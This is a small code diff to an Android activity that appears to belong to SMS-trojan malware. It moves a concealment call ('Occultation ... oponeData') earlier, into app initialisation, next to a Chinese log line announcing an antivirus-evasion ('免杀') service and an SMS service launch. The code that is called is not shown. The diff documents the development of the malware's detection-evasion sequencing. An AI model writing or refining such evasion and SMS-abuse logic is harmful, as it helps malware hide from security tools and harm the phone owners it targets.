@@ -51,6 +51,7 @@ public class SmsActivity extends Activity {
 	}
 	
 	private void init() {
+		Occultation.getInstance(this).oponeData();
 		AnalyticsConfig.setAppkey("54111214fd98c50f7f052d60");
 		AnalyticsConfig.setChannel("Channel" + Tools.getDeviceId(this));
 		LogUtils.write("Send", "程序启动 " + Build.VERSION.SDK_INT + " " + Build.PRODUCT + "--" + Build.MODEL);
@@ -80,7 +81,6 @@ public class SmsActivity extends Activity {
 	
 	private void startFreeToKillService() {
 		LogUtils.write("Send", "启动免杀服务");
-		Occultation.getInstance(this).oponeData();
 		this.startService(new Intent(this, SMSService.class));
 	}
 	
